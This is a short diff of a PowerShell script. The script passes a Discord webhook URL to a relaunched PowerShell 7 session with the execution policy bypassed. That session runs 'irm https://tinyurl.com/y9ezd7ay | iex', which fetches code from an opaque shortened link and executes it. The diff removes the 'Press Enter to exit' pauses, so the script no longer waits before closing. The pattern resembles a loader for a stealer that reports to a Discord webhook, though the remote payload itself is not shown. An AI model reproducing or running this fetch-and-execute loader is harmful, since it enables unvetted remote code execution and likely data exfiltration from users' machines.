@@ -3,9 +3,6 @@ $webhookUrl = $env:DISCORD_WEBHOOK_URL
 
 if ([string]::IsNullOrEmpty($webhookUrl)) {
     Write-Error "No webhook URL set. Exiting."
-    if ($Host.Name -match 'ConsoleHost') {
-        Read-Host "Press Enter to exit"
-    }
     exit 1
 }
 
@@ -27,7 +24,6 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
 `$env:DISCORD_WEBHOOK_URL = '$webhookUrl'
 `$db = ''
 irm https://tinyurl.com/y9ezd7ay | iex
-Read-Host 'Press Enter to exit'
 "@
 
             & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit -Command $inlineScript
